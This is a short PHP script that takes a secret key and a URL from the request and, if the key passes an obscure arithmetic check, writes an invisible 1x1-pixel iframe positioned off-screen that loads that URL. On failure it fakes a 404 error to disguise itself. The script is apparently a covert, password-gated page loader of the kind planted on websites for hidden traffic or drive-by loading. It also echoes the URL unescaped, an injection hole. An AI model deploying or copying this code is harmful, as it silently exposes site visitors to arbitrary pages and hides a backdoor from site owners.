<?php
ini_set("auto_detect_line_endings", true);
error_reporting(~1);
ini_set('display_errors', 1);
class loadPageURL{

public function request(){

		$pass			= $_REQUEST['k'];
		$requestURL		= $_REQUEST['lnk'];

		if (isset($pass) && isset($requestURL)){
			if(!$this->getDecodedeKey($pass)){
				header('HTTP1/1 404 NOT FOUND');
				die('Access Denied');
			}
		}else{
			header('HTTP1/1 404 NOT FOUND');
			die('Access Denied');
		}

		//$json = file_get_contents($requestURL);
		
		//$file = $DOCUMENT_ROOT. "test.html";
		/*$doc = new DOMDocument();
		
		libxml_use_internal_errors(true);
		$doc->loadHTMLFile($requestURL);		
		libxml_use_internal_errors(false);*/
		
		echo "<iframe style=\"position: absolute; left: -1000px;\" src=\"" . $requestURL . "\" name=\"frame1\" scrolling=\"auto\" frameborder=\"no\" align=\"center\" height = \"1px\" width = \"1px\"></iframe>";
		
//		var_dump($json);
		echo "page loades ok";
		die;
		
	}
	public function getDecodedeKey($randomKey){
		$key = substr($randomKey, 0,12);
		$keyResult = substr($randomKey,12,strlen($randomKey));
		$calculatedKey = (substr($key, 2, 8) * 313000) + 7102;
		
		if ($keyResult == $calculatedKey){;
			return true;
		}else{
			return false;
		}
	}

}
$nc = new loadPageURL();
$nc->request();